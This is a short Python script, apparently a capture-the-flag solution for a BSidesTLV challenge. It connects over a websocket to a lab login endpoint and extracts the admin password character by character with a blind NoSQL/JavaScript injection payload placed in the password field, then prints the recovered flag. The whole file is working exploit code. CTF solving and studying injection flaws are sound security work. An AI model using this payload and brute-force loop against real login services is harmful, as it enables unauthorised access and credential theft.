import string
from websocket import create_connection


def crack_char(index):
    for char in string.printable:
        pass_inject = "' || this.password[%d] == '%s" % (index, char)
        data = "{\"username\":\"admin\", \"password\": \"%s\"}" % pass_inject
        ws.send(data)
        response = ws.recv()
        if b"Success!" in response:
            return char


ws = create_connection('ws://192.168.189.128:8000/login')
response = ""
for i in range(10, 30):
    if str(crack_char(i)) == 'None':
    	continue
    response += str(crack_char(i))
    print (response)

print('Flag: BSidesTLV{' + (response))  # BSidesTLV{0r0n3Equ4l0n3!}
ws.close()
